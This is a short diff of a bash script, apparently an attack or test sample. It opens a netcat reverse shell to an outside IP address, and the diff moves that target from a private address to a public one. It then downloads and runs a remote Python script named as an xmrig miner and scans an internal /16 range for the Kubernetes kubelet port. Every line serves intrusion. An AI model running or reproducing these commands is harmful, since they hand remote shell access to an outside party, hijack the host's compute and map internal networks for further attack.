@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 apt-get install -y netcat-traditional python3
-nc 192.168.1.40 4242 -e /bin/bash &
+nc 205.134.240.43 4242 -e /bin/bash &
 wget https://raw.githubusercontent.com/uptycs-nhegde/super-benign-scripts/master/xmrig_final.py -O run.py
 python3 run.py &
 masscan -p10250 192.168.0.0/16 --rate=1000 > /tmp/out
